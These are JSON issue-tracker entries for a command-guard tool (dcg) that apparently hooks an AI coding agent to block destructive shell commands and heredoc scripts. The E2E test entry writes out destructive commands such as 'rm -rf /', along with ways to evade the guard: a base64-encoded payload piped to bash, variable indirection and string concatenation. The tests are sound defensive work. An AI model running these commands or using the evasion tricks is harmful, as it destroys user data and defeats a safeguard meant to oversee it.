{"id":"git_safety_guard-cpal","title":"Implement custom pattern allowlisting for heredoc scanning","description":"# Custom Pattern Allowlisting\n\n## Objective\n\nAllow users to define custom allowlist patterns for heredocs that are known-safe in their environment.\n\n## Use Cases\n\n1. **Internal tools**: Company has internal scripts that trigger false positives\n2. **Test environments**: CI/CD scripts that intentionally use destructive patterns\n3. **Development workflows**: Developers who understand the risks\n\n## Configuration Format\n\n```toml\n# ~/.config/dcg/config.toml\n\n[heredoc.allowlist]\n# Allow specific commands entirely\ncommands = [\n    \"./scripts/cleanup.sh\",\n    \"/opt/company/internal-tool\",\n]\n\n# Allow specific patterns in heredocs\npatterns = [\n    { language = \"python\", pattern = \"our_safe_module.cleanup()\", reason = \"Internal cleanup tool\" },\n    { language = \"bash\", pattern = \"docker system prune\", reason = \"CI cleanup\" },\n]\n\n# Allow heredocs matching specific content hashes (SHA256)\ncontent_hashes = [\n    { hash = \"abc123...\", reason = \"Approved deployment script v1.2\" },\n]\n\n# Per-project overrides\n[[heredoc.allowlist.projects]]\npath = \"/home/user/trusted-project\"\npatterns = [\n    { language = \"bash\", pattern = \"rm -rf ./build\", reason = \"Build cleanup\" },\n]\n```\n\n## Implementation\n\n```rust\n#[derive(Debug, Deserialize)]\nstruct AllowlistConfig {\n    commands: Vec\u003cString\u003e,\n    patterns: Vec\u003cAllowedPattern\u003e,\n    content_hashes: Vec\u003cContentHash\u003e,\n    projects: Vec\u003cProjectOverride\u003e,\n}\n\n#[derive(Debug, Deserialize)]\nstruct AllowedPattern {\n    language: Option\u003cLanguage\u003e,\n    pattern: String,\n    reason: String,\n}\n\nimpl AllowlistConfig {\n    fn is_allowed(\u0026self, cmd: \u0026str, heredoc: \u0026HeredocInfo) -\u003e Option\u003c\u0026str\u003e {\n        // Check command allowlist\n        for allowed_cmd in \u0026self.commands {\n            if cmd.starts_with(allowed_cmd) {\n                return Some(\"Command in allowlist\");\n            }\n        }\n\n        // Check pattern allowlist\n        for pattern in \u0026self.patterns {\n            if pattern.language.map_or(true, |l| l == heredoc.language) {\n                if heredoc.content.contains(\u0026pattern.pattern) {\n                    return Some(\u0026pattern.reason);\n                }\n            }\n        }\n\n        // Check content hash\n        let hash = sha256(\u0026heredoc.content);\n        for ch in \u0026self.content_hashes {\n            if ch.hash == hash {\n                return Some(\u0026ch.reason);\n            }\n        }\n\n        None\n    }\n}\n```\n\n## CLI Support\n\n```bash\n# Add pattern to allowlist\ndcg allowlist add --language python --pattern \"my_tool.run()\" --reason \"Internal tool\"\n\n# Add current command to allowlist (interactive)\ndcg allowlist add-current\n\n# List allowlist entries\ndcg allowlist list\n\n# Remove entry\ndcg allowlist remove --id 3\n\n# Generate hash for content\ndcg allowlist hash \u003c script.py\n```\n\n## Security Considerations\n\n1. **Audit logging**: Log all allowlist matches\n2. **Minimal scope**: Encourage specific patterns over broad ones\n3. **Expiration**: Optional expiry dates for temporary allowances\n4. **Team sharing**: Project-level allowlists in version control\n\n## Test Cases\n\n```rust\n#[test]\nfn test_command_allowlist() {\n    let config = AllowlistConfig {\n        commands: vec![\"./scripts/approved.sh\".to_string()],\n        ..Default::default()\n    };\n\n    assert!(config.is_allowed(\"./scripts/approved.sh arg1\", \u0026heredoc).is_some());\n    assert!(config.is_allowed(\"./scripts/other.sh\", \u0026heredoc).is_none());\n}\n\n#[test]\nfn test_pattern_allowlist() {\n    let config = AllowlistConfig {\n        patterns: vec![AllowedPattern {\n            language: Some(Language::Python),\n            pattern: \"company_tool.cleanup()\".to_string(),\n            reason: \"Approved\".to_string(),\n        }],\n        ..Default::default()\n    };\n\n    let heredoc = HeredocInfo {\n        content: \"import company_tool\\ncompany_tool.cleanup()\".to_string(),\n        language: Language::Python,\n        ..Default::default()\n    };\n\n    assert!(config.is_allowed(\"python3 \u003c\u003cEOF\", \u0026heredoc).is_some());\n}\n```\n\n## Acceptance Criteria\n\n- Allowlisting works by stable identifiers / explicit user intent (no silent broad allow).\n- Allowlist matches are visible in explain/log output (rule matched + allowlist reason).\n- Supports at least:\n  - per-language substring allow patterns\n  - content-hash allow\n  - project-scoped allow\n- Includes unit tests for each allowlist mechanism and a negative test ensuring unrelated content does not allow.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:08:02.241386785-05:00","dependencies":[{"issue_id":"git_safety_guard-cpal","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:46:47.559411582-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-du4","title":"Implement language detection from command context","description":"# Implement Language Detection from Command Context\n\n## Objective\n\nImplement the language detection logic that determines which parser/patterns to use for heredoc content.\n\n## Background\n\nBased on the design (`git_safety_guard-jfj`), implement the multi-source language detection:\n\n1. Command prefix lookup\n2. Shebang detection\n3. Content heuristics (fallback)\n\n## Implementation Details\n\n### Language Enum\n\n```rust\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\npub enum Language {\n    Python,\n    Bash,\n    JavaScript,\n    TypeScript,\n    Ruby,\n    Perl,\n    Php,\n    Unknown,\n}\n\nimpl Language {\n    /// Get the tree-sitter/ast-grep language identifier\n    pub fn grammar_name(\u0026self) -\u003e Option\u003c\u0026'static str\u003e {\n        match self {\n            Self::Python =\u003e Some(\"python\"),\n            Self::Bash =\u003e Some(\"bash\"),\n            Self::JavaScript =\u003e Some(\"javascript\"),\n            Self::TypeScript =\u003e Some(\"typescript\"),\n            Self::Ruby =\u003e Some(\"ruby\"),\n            Self::Perl =\u003e Some(\"perl\"),\n            Self::Php =\u003e Some(\"php\"),\n            Self::Unknown =\u003e None,\n        }\n    }\n}\n```\n\n### Command Prefix Mapping\n\n```rust\nstatic COMMAND_LANGUAGE_MAP: LazyLock\u003cHashMap\u003c\u0026'static str, Language\u003e\u003e = LazyLock::new(|| {\n    let mut m = HashMap::new();\n    // Python\n    m.insert(\"python\", Language::Python);\n    m.insert(\"python3\", Language::Python);\n    m.insert(\"python2\", Language::Python);\n    // Bash/Shell\n    m.insert(\"bash\", Language::Bash);\n    m.insert(\"sh\", Language::Bash);\n    m.insert(\"zsh\", Language::Bash);\n    m.insert(\"ksh\", Language::Bash);\n    // JavaScript/Node\n    m.insert(\"node\", Language::JavaScript);\n    m.insert(\"nodejs\", Language::JavaScript);\n    // ... etc\n    m\n});\n\npub fn detect_from_command(cmd: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Extract first word (command name)\n    let first_word = cmd.split_whitespace().next()?;\n    // Handle paths: /usr/bin/python3 -\u003e python3\n    let basename = first_word.rsplit('/').next()?;\n    COMMAND_LANGUAGE_MAP.get(basename).copied()\n}\n```\n\n### Shebang Detection\n\n```rust\npub fn detect_from_shebang(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    let first_line = content.lines().next()?;\n    if !first_line.starts_with(\"#!\") {\n        return None;\n    }\n    // Parse: #!/usr/bin/env python3 -\u003e python3\n    // Parse: #!/bin/bash -\u003e bash\n    let interpreter = first_line\n        .strip_prefix(\"#!\")?\n        .trim()\n        .split_whitespace()\n        .last()?\n        .rsplit('/')\n        .next()?;\n    COMMAND_LANGUAGE_MAP.get(interpreter).copied()\n}\n```\n\n### Content Heuristics (Fallback)\n\n```rust\npub fn detect_from_content(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Very basic heuristics - only if nothing else works\n    let lines: Vec\u003c\u0026str\u003e = content.lines().take(10).collect();\n\n    // Python indicators\n    if lines.iter().any(|l| l.starts_with(\"import \") || l.starts_with(\"from \")) {\n        return Some(Language::Python);\n    }\n\n    // JavaScript/Node indicators\n    if lines.iter().any(|l| l.contains(\"require(\") || l.contains(\"const \") || l.contains(\"let \")) {\n        return Some(Language::JavaScript);\n    }\n\n    // Ruby indicators\n    if lines.iter().any(|l| l.starts_with(\"def \") \u0026\u0026 content.contains(\"end\")) {\n        return Some(Language::Ruby);\n    }\n\n    None\n}\n```\n\n### Combined Detection\n\n```rust\npub fn detect_language(cmd: \u0026str, heredoc: \u0026HeredocContent) -\u003e Language {\n    // Priority 1: Command prefix\n    if let Some(lang) = detect_from_command(cmd) {\n        return lang;\n    }\n\n    // Priority 2: Shebang\n    if let Some(lang) = detect_from_shebang(\u0026heredoc.content) {\n        return lang;\n    }\n\n    // Priority 3: Content heuristics\n    if let Some(lang) = detect_from_content(\u0026heredoc.content) {\n        return lang;\n    }\n\n    Language::Unknown\n}\n```\n\n## Testing\n\n- Test command prefix for all supported commands\n- Test shebang detection with various formats\n- Test content heuristics\n- Test fallback chain\n\n## Acceptance Criteria\n\n- Implements the priority order defined in `git_safety_guard-jfj` deterministically.\n- Correctly identifies language for the majority of representative fixtures and returns `Unknown` for genuinely unknown cases.\n- No panics on malformed input; bounded heuristics (only small prefix of content inspected).\n- Provides enough diagnostics for `dcg explain` to show *why* a language was chosen (or why it was unknown).\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:49.058497233-05:00","created_by":"ubuntu","updated_at":"2026-01-08T02:00:29.04442147-05:00","closed_at":"2026-01-08T02:00:29.04442147-05:00","close_reason":"Language detection fully implemented: from_shebang(), from_content(), detect() with priority order. DetectionConfidence enum for explain mode. 18 tests pass.","dependencies":[{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:58.308674617-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:31:58.326331058-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:10.349869871-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e2eh","title":"Extend e2e_test.sh with heredoc test cases","description":"# E2E Test Script Extension for Heredocs\n\n## Objective\n\nExtend the existing `scripts/e2e_test.sh` with comprehensive heredoc test cases.\n\n## Test Categories to Add\n\n### 1. Heredoc Detection Tests\n\n```bash\n# Should BLOCK - Python heredoc with os.system\ntest_blocked 'python3 \u003c\u003c EOF\nimport os\nos.system(\"rm -rf /tmp/test\")\nEOF' \"Python heredoc with os.system\"\n\n# Should BLOCK - Bash heredoc with rm\ntest_blocked 'bash \u003c\u003c EOF\nrm -rf /important\nEOF' \"Bash heredoc with rm -rf\"\n\n# Should BLOCK - Node inline script\ntest_blocked 'node -e \"require(\\x27child_process\\x27).execSync(\\x27rm -rf /\\x27)\"' \"Node inline with execSync\"\n```\n\n### 2. Heredoc Variant Tests\n\n```bash\n# Test all heredoc syntaxes\ntest_blocked 'cat \u003c\u003cEOF | python3\nimport os; os.system(\"rm -rf /\")\nEOF' \"Piped heredoc\"\n\ntest_blocked 'python3 \u003c\u003c-EOF\n    import os\n    os.system(\"rm -rf /\")\nEOF' \"Indented heredoc (\u003c\u003c-)\"\n\ntest_blocked 'python3 \u003c\u003c\\x27EOF\\x27\nimport os\nos.system(\"rm -rf /\")\nEOF' \"Quoted delimiter heredoc\"\n```\n\n### 3. Language Coverage Tests\n\n```bash\n# Python\ntest_blocked 'python3 -c \"import shutil; shutil.rmtree(\\x27/tmp\\x27)\"'\n\n# Ruby  \ntest_blocked 'ruby -e \"FileUtils.rm_rf(\\x27/tmp\\x27)\"'\n\n# Perl\ntest_blocked 'perl -e \"system(\\x27rm -rf /\\x27)\"'\n\n# JavaScript\ntest_blocked 'node -e \"require(\\x27fs\\x27).rmdirSync(\\x27/\\x27, {recursive:true})\"'\n```\n\n### 4. False Positive Tests\n\n```bash\n# Should ALLOW - Documentation with dangerous strings\ntest_allowed 'bd create --description=\"This pattern blocks rm -rf\"' \"Doc with rm -rf\"\ntest_allowed 'git commit -m \"Fix git reset --hard detection\"' \"Commit msg\"\ntest_allowed 'grep \"rm -rf\" src/main.rs' \"Grep for pattern\"\ntest_allowed 'echo \"example: git push --force\"' \"Echo example\"\n```\n\n### 5. Bypass Attempt Tests\n\n```bash\n# Variable indirection\ntest_blocked 'bash -c \"CMD=rm; $CMD -rf /\"' \"Variable indirection\"\n\n# Base64 encoding\ntest_blocked 'bash -c \"echo cm0gLXJmIC8K | base64 -d | bash\"' \"Base64 bypass\"\n\n# String concatenation  \ntest_blocked 'python3 -c \"exec(\\x27r\\x27+\\x27m\\x27+\\x27 -rf /\\x27)\"' \"String concat\"\n```\n\n### 6. Edge Cases\n\n```bash\n# Empty heredoc\ntest_allowed 'cat \u003c\u003c EOF\nEOF' \"Empty heredoc\"\n\n# Safe heredoc content\ntest_allowed 'python3 \u003c\u003c EOF\nprint(\"hello world\")\nEOF' \"Safe Python heredoc\"\n\n# Nested quotes\ntest_blocked 'bash -c \"bash -c \\x27rm -rf /\\x27\"' \"Nested shells\"\n```\n\n## Logging Enhancement\n\nAdd verbose mode:\n```bash\n#!/bin/bash\nset -euo pipefail\n\nVERBOSE=${VERBOSE:-0}\nLOG_FILE=\"e2e_test_$(date +%Y%m%d_%H%M%S).log\"\n\nlog() {\n    echo \"[$(date '+%H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\ntest_blocked() {\n    local cmd=\"$1\"\n    local desc=\"$2\"\n    log \"TEST: $desc\"\n    log \"  CMD: ${cmd:0:80}...\"\n\n    if echo \"{\\\"tool_name\\\":\\\"Bash\\\",\\\"tool_input\\\":{\\\"command\\\":\\\"$cmd\\\"}}\" | ./target/release/dcg 2\u003e/dev/null; then\n        log \"  FAIL: Expected block, got allow\"\n        return 1\n    else\n        log \"  PASS: Correctly blocked\"\n        return 0\n    fi\n}\n```\n\n## Output Summary\n\nAt end of test run:\n```\n=====================================\nE2E Test Summary\n=====================================\nTotal tests: 150\nPassed: 148\nFailed: 2\nSkipped: 0\n\nFailed tests:\n  - Python heredoc with subprocess (line 234)\n  - Node inline with dynamic require (line 456)\n\nLog file: e2e_test_20260107_193045.log\n=====================================\n```\n\n## Acceptance Criteria\n\n- `scripts/e2e_test.sh` contains a dedicated heredoc section with:\n  - true-positive blocks across at least 3 languages\n  - false-positive regression cases (doc/test strings)\n  - a small set of bypass-attempt cases\n- Verbose logging is available and includes per-test:\n  - test name\n  - normalized command (truncated)\n  - decision (allow/deny) and rule attribution when denied\n  - failure diagnostics sufficient for CI triage\n- The heredoc E2E suite runs deterministically and completes in a reasonable time budget (define target after baseline).\n","notes":"Adding multi-language heredoc/inline E2E coverage + logging improvements now that e7m is integrated.","status":"closed","priority":1,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T06:52:18.249005975-05:00","closed_at":"2026-01-08T06:52:18.249005975-05:00","close_reason":"Expanded scripts/e2e_test.sh heredoc/inline suite to cover multi-language blocks (node/python/ruby/perl/bash), added safe heredoc cases + safe-string trigger regression, and improved verbose logs to surface rule attribution from denial reason.","dependencies":[{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.841249285-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:08:55.268336107-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:08.884862029-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e7m","title":"Integrate heredoc detection into main check pipeline","description":"## Objective\n\nIntegrate all heredoc detection components into the main dcg check pipeline, creating a seamless flow from command input to block/allow decision.\n\n## Pipeline Architecture\n\n```\nJSON Input → Parse → Quick Reject → Normalize →\n  → Heredoc Detection → [if heredoc found] →\n    → Extract Content → Detect Language → Parse with ast-grep →\n    → Apply Language Patterns → Block Decision\n  → [no heredoc] → Existing Pattern Matching → Block Decision\n```\n\n## Integration Points\n\n### 1. Entry Point Hook\n\nModify main.rs check flow to:\n\n1. After quick reject passes, check for heredoc indicators\n2. If heredoc found, branch to heredoc analysis path\n3. If no heredoc, continue with existing pattern matching\n4. Merge results from both paths\n\n### 2. Heredoc Detection Integration\n\nInsert heredoc detection before main pattern matching:\n\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // NEW: Heredoc detection\n    if let Some(heredoc_result) = check_heredoc(cmd) {\n        if heredoc_result.blocked {\n            return heredoc_result;\n        }\n    }\n\n    // Existing pattern matching\n    REGISTRY.check_command(cmd, \u0026enabled_packs)\n}\n```\n\n### 3. Performance Budget\n\nTotal additional latency budget must be bounded.\n\n- Tier 1 trigger: microseconds\n- Tier 2 extraction: ~1ms typical\n- Tier 3 AST/pattern: bounded by timeout (hard cap)\n\nIf AST analysis is too slow, fail-open (allow) in hook mode and emit a diagnostic.\n\n### 4. Feature Flag / Pack integration\n\nAdd heredoc scanning to pack system:\n\n- New pack: \"heredoc\" (or integrate into core)\n- Can be enabled/disabled via configuration\n- Default policy should be conservative (warn-first / strict mode opt-in)\n\n### 5. Error Handling\n\nGraceful degradation:\n\n- AST engine unavailable → allow (hook) + diagnostic; optional fallback to simpler scanning\n- AST timeout → allow (hook) + diagnostic\n- Parse error → allow (hook) + diagnostic\n- Unknown language → allow (hook) or generic high-signal checks only\n\n## Configuration\n\nNew config options:\n\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nfallback_on_error = true\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n```\n\n## Testing Integration\n\nIntegration tests should cover:\n\n- Normal commands (no heredoc) still work fast\n- Heredoc commands get analyzed\n- Pattern matches in heredocs block correctly\n- Safe heredocs pass through\n- Error paths handle gracefully\n\n## Acceptance Criteria\n\n- Heredoc path is executed only when Tier 1 triggers; non-heredoc commands remain fast.\n- In hook mode, any heredoc parsing timeout/error fails open (allow) with a trace/log marker.\n- At least one E2E test demonstrates a real heredoc block (direct destructive payload).\n- At least one E2E test demonstrates a false-positive suppression case (dangerous string in data-only context).\n- Decisions are attributed with stable rule IDs (pack_id + pattern_name) so explain/allowlist workflows are possible.\n","notes":"Claiming to integrate heredoc detection/extraction/AST matching into main check pipeline (hook + CLI parity). Will keep hot path fast (Tier1 trigger), fail-open on parse/timeout, and add targeted integration + e2e coverage.","status":"closed","priority":1,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T18:38:07.195631302-05:00","created_by":"ubuntu","updated_at":"2026-01-08T06:40:45.489232617-05:00","closed_at":"2026-01-08T06:40:45.489232617-05:00","close_reason":"Integrated Tier1→Tier2→Tier3 heredoc/inline-script scanning into shared evaluator and hook path; added unit + e2e coverage; wired heredoc language detection for non-bash heredocs","dependencies":[{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:39:24.471336629-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:39:24.491188224-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:39:24.509697502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:39:24.528749381-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:39:31.682050985-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:39:31.702476952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:39:31.720255513-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:39:31.739706774-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:39:31.75902245-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:39:31.776348198-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:39:31.795580477-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:08:41.394423996-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:13.926890146-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T23:13:38.409432025-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-ehc","title":"Implement GitLab CI extractor (.gitlab-ci.yml)","description":"## Objective\n\nImplement an extractor for GitLab CI YAML files to detect executable command contexts.\n\n## File Pattern\n\n- `.gitlab-ci.yml`\n- `*.gitlab-ci.yml` (includes)\n\n## Extraction Targets\n\n### Script Blocks (executed)\n- `script:` arrays\n- `before_script:` arrays\n- `after_script:` arrays\n\n### NOT Extracted (data only)\n- `variables:` values\n- `rules:` conditions\n- `only:`/`except:` patterns\n- Comments\n\n## Example\n\n```yaml\ndeploy:\n  script:\n    - kubectl delete namespace prod  # EXTRACT THIS\n  variables:\n    DANGEROUS: \"rm -rf /\"  # DO NOT extract\n```\n\n## Acceptance Criteria\n\n- Correctly extracts script blocks with line numbers\n- Ignores variable definitions and comments\n- Handles YAML anchors and aliases\n- Unit tests with representative fixtures","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only from executed job script contexts (e.g., `script:` sections), not from:\n  - variables\n  - comments\n  - descriptive fields\n- Include negative fixtures covering “dangerous substring in docs/variables” cases.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.250174884-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:21.225078074-05:00","dependencies":[{"issue_id":"git_safety_guard-ehc","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.517428749-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-ehc","depends_on_id":"git_safety_guard-scan.6","type":"parent-child","created_at":"2026-01-07T21:46:22.595864802-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-erux","title":"Design user-friendly error messages for heredoc blocks","description":"# User-Friendly Error Messages for Heredoc Blocking\n\n## Objective\n\nWhen a heredoc command is blocked, provide clear, actionable error messages that help users understand WHY it was blocked and HOW to proceed.\n\n## Current Error Format (for reference)\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Command Detected                   ║\n╠══════════════════════════════════════════════════════════════╣\n║  Command: git reset --hard HEAD~5                            ║\n║  Reason:  Hard reset can permanently lose commits            ║\n║  Pack:    core.git                                           ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Enhanced Error Format for Heredocs\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Pattern in Heredoc                 ║\n╠══════════════════════════════════════════════════════════════╣\n║  Language: Python                                            ║\n║  Pattern:  os.system($CMD)                                   ║\n║  Matched:  os.system(\"rm -rf /tmp/data\")                    ║\n║  Line:     3 of heredoc                                      ║\n║  Reason:   Shell command execution via os.system             ║\n║  Pack:     heredoc.python                                    ║\n╠══════════════════════════════════════════════════════════════╣\n║  Context:                                                    ║\n║    1│ import os                                              ║\n║    2│ path = \"/tmp/data\"                                    ║\n║  ▶ 3│ os.system(\"rm -rf /tmp/data\")  ← BLOCKED             ║\n║    4│ print(\"done\")                                         ║\n╠══════════════════════════════════════════════════════════════╣\n║  💡 Suggestions:                                             ║\n║  • Use pathlib.Path.unlink() for single file deletion       ║\n║  • Use shutil.rmtree() with explicit path validation        ║\n║  • If intentional, use dcg allow --reason \"...\"             ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Error Message Components\n\n### 1. Header\n\n- Clear indication this is a BLOCK, not just a warning\n- Specify it's a heredoc/inline script detection\n\n### 2. Detection Details\n\n- Language detected\n- Pattern name that matched\n- Actual matched text (truncated if long)\n- Line number within heredoc\n- Human-readable reason\n\n### 3. Context Window\n\n- Show 2-3 lines before and after the match\n- Highlight the offending line with arrow\n- Syntax highlighting if terminal supports it\n\n### 4. Suggestions\n\n- Language-specific safe alternatives\n- How to override if intentional\n- Link to documentation\n\n## JSON Output Format\n\nFor Claude Code hook protocol:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"permissionDecision\": \"deny\",\n    \"reason\": \"Heredoc contains destructive pattern: os.system with shell command\",\n    \"details\": {\n      \"detection_type\": \"heredoc\",\n      \"language\": \"python\",\n      \"pattern\": \"os.system($CMD)\",\n      \"matched_text\": \"os.system(\\\"rm -rf /tmp/data\\\")\",\n      \"line_in_heredoc\": 3,\n      \"pack\": \"heredoc.python\",\n      \"suggestions\": [\n        \"Use pathlib.Path.unlink() for single file deletion\",\n        \"Use shutil.rmtree() with explicit path validation\"\n      ]\n    }\n  }\n}\n```\n\n## Suggestions Database\n\nMaintain per-pattern suggestions:\n\n```rust\nstatic PATTERN_SUGGESTIONS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"os.system\", \u0026[\n        \"Use subprocess.run() with shell=False\",\n        \"Use pathlib for file operations\",\n    ]),\n    (\"shutil.rmtree\", \u0026[\n        \"Validate path is within expected directory\",\n        \"Use explicit allowlist of deletable paths\",\n    ]),\n];\n```\n\n## Test Cases\n\n- Verify all pattern types have suggestions\n- Verify context window is correctly extracted\n- Verify line numbers are accurate\n- Verify JSON output is valid\n- Verify color output is readable\n- Verify truncation for long matches\n\n## Acceptance Criteria\n\n- When heredoc detection blocks, stderr output includes:\n  - language\n  - stable rule ID (pack_id:pattern_name)\n  - a small context window with highlighted line\n  - actionable next steps (explain/allowlist)\n- Hook JSON denial remains valid and includes enough structured details for tooling.\n- Output is safe for non-TTY environments (no ANSI when not a TTY).\n- Unit tests cover at least:\n  - context window extraction\n  - truncation\n  - JSON schema validity\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:45:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:08:48.580223035-05:00","dependencies":[{"issue_id":"git_safety_guard-erux","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:30:59.175383831-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-erux","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:15.48203282-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-f4f","title":"Implement ast-grep-core pattern matching layer","description":"# ast-grep-core Pattern Matching Layer\n\n## Objective\n\nIntegrate ast-grep-core as a Rust library for structural pattern matching in heredoc/inline-script content.\n\n## Architecture decision\n\nPrefer **embedded ast-grep-core** over shelling out to a CLI, because:\n\n- avoids per-invocation process spawn overhead\n- keeps a single-binary distribution story\n- enables richer match metadata (spans) for `dcg explain`\n\n(Still subject to ADR confirmation; this task implements whichever embedded approach is chosen.)\n\n## Dependencies to add (tentative)\n\n```toml\n[dependencies]\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\n    \"bash\",\n    \"python\",\n    \"javascript\",\n    \"typescript\",\n    \"ruby\"\n    # Note: Perl may not be available\n] }\n```\n\n## API design\n\n```rust\n/// Pattern matcher using ast-grep-core\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    /// Create matcher with default destructive patterns\n    pub fn new() -\u003e Self;\n\n    /// Load patterns from config / registry\n    pub fn from_config(config: \u0026PatternConfig) -\u003e Result\u003cSelf\u003e;\n\n    /// Match patterns against code (bounded)\n    pub fn find_matches(\u0026self, code: \u0026str, language: Language) -\u003e Result\u003cVec\u003cPatternMatch\u003e, MatchError\u003e;\n}\n\n/// Result of pattern matching\npub struct PatternMatch {\n    pub rule_id: String,             // stable: pack_id:pattern_name\n    pub reason: String,\n    pub matched_text_preview: String,\n    pub start: usize,                // byte offset (or row/col)\n    pub end: usize,\n    pub line_number: usize,\n    pub severity: Severity,          // ties into decision policy\n}\n\npub enum Severity { Error, Warning, Info }\n```\n\n## Pattern definition format (example)\n\nPatterns should be defined and reviewed under `git_safety_guard-6sg` (pattern library structure). The matching layer must be agnostic to *what* the patterns are, but must support:\n\n- stable IDs\n- per-pattern severity\n- per-pattern suggestions (optional)\n\n## Error handling / fail-open\n\nIn hook mode:\n\n- Unsupported language → skip analysis (allow) + trace marker\n- Parse error → skip analysis (allow) + trace marker\n- Timeout → skip analysis (allow) + trace marker\n\nIn `dcg test` / `dcg explain` / `dcg scan`:\n\n- return structured diagnostics (not silent skip)\n\n## Performance targets (initial)\n\n- Pattern compilation: one-time at startup (bounded)\n- Parse: \u003c2ms for typical heredoc sizes\n- Match: \u003c1ms typical\n- Total AST path: bounded by a hard timeout\n\n## Acceptance Criteria\n\n- Implements an embedded AST matcher that can:\n  - parse at least one supported language\n  - match at least one simple pattern\n  - return match spans + line number\n- Enforces a hard timeout for AST work and fails open in hook mode on timeout.\n- Produces match metadata compatible with:\n  - `dcg explain` highlighting (matched span + preview)\n  - rule attribution (stable rule_id)\n 